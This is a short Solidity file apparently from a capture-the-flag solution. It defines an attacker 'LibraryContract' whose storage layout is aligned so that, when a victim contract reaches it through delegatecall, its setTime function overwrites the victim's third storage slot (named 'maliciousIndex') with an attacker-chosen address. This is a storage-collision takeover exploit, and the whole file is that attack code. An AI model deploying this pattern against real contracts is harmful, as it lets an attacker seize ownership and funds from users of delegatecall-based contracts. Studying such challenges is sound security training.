pragma solidity ^0.6.0;

contract LibraryContract {

  // stores a timestamp 
  address doesNotMatterWhatThisIsOne;
  address doesNotMatterWhatThisIsTwo;
  address maliciousIndex;

  function setTime(uint _time) public {
    maliciousIndex = address(_time);
  }
}
